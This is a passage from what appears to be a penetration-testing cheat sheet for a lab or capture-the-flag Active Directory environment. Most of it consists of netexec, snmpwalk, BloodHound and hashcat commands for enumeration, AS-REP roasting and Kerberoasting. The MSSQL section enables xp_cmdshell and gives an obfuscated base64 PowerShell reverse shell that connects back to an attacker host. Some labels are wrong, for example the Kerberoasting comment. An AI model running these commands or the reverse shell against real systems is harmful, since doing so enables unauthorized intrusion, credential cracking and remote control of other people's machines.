netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --users --groups --password-policy | tee ldap_enum.txt

# Extract all users
netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --users --json | jq -r '.hosts[].users[] | .username' | sort -u | tee users.txt

# Enumerate domain trusts
netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --trusts | tee domain_trusts.txt
```

### 🔍 MSSQL Enumeration

#### **Manual Commands (netexec)**

```bash
# Check MSSQL login (including null session)
netexec mssql 10.10.10.5 -u '' -p ''
netexec mssql 10.10.10.5 -u 'contoso\bob' -p 'Password123'

# List databases
netexec mssql 10.10.10.5 -u 'contoso\bob' -p 'Password123' --query "SELECT name FROM sys.databases" | tee mssql_databases.txt

# Enable xp_cmdshell
netexec mssql 10.10.10.5 -u 'contoso\bob' -p 'Password123' --enable-xp-cmdshell

# Execute command via xp_cmdshell
netexec mssql 10.10.10.5 -u 'contoso\bob' -p 'Password123' --xp-cmd "whoami /all" | tee xp_cmdshell_output.txt

#check privesc:
netExec mssql <ip> -u user -p password -M mssql_priv

#check impersonate:
netExec mssql <ip> -u user -p password -M mssql_priv -o ACTION=privesc

#reverse shell on active directory:
nxc mssql <ip> -u '' -p '' -x 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AOAA2AC4AMQA0ADcAIgAsADEAMgAzADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

### 🔍 RDP & WinRM Enumeration

#### **Manual Commands (netexec)**

```bash
# Enumerate RDP access
netexec winrm 10.10.10.5 -u 'contoso\bob' -p 'Password123' --local-groups --users | tee rdp_users.txt

# Check if WinRM is enabled
netexec winrm 10.10.10.5 -u 'contoso\bob' -p 'Password123' --exec whoami
```

### 🔍 SNMP Enumeration

#### **Manual Commands**

```bash
# Enumerate SNMP with public community string
snmpwalk -v2c -c public 10.10.10.5

# Check running processes
snmpwalk -v2c -c public 10.10.10.5 1.3.6.1.2.1.25.4.2.1.2

# Enumerate open TCP ports
snmpwalk -v2c -c public 10.10.10.5 1.3.6.1.2.1.6.13.1.3
```

### 🔍 BloodHound Collection

#### **Manual Commands (BloodHound)**

```bash
# Collect BloodHound data
bloodhound-python -d contoso.htb -c all -u oorend -p '1GR8t@$$4u' -ns 10.10.11.231 --zip
```

### 🔍 Low Hanging Fruits Checks

#### **Manual Commands (netexec)**

```bash
# Check password policy
netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --password-policy | tee password_policy.txt

# Identify AS-REP roastable users
netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --asreproast | tee asrep_roast.txt
# Crack hashes with hashcat: hashcat -m 18200 asrep_roast.txt rockyou.txt

# Check for unconstrained delegation
netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --unconstrained | tee unconstrained_deleg.txt

# Check if the user is an admin
netexec smb 10.10.10.5 -u 'contoso\bob' -p 'Password123' --admin-check | tee admin_access.txt
```

### 🔍 Kerberos Enumeration

#### **Manual Commands (netexec)**

```bash
# Enumerate Kerberos tickets (TGT/TGS)
netexec smb 10.10.10.5 -u 'contoso\bob' -p 'Password123' --kerberos | tee kerberos_tickets.txt

# Enumerate users that don’t require pre-authentication (Kerberoasting)
netexec ldap 10.10.10.5 -u 'contoso\bob' -p 'Password123' --kerberoast | tee kerberoast.txt
# Crack hashes with hashcat: hashcat -m 13100 kerberoast.txt rockyou.txt
```

### 🔍 DNS Enumeration

#### **Manual Commands**

```bash
# Test DNS zone transfer
nslookup -type=AXFR contoso.local 10.10.10.5 | tee dns_zone_transfer.txt

# Resolve domain name
nslookup contoso.local 10.10.10.5
```
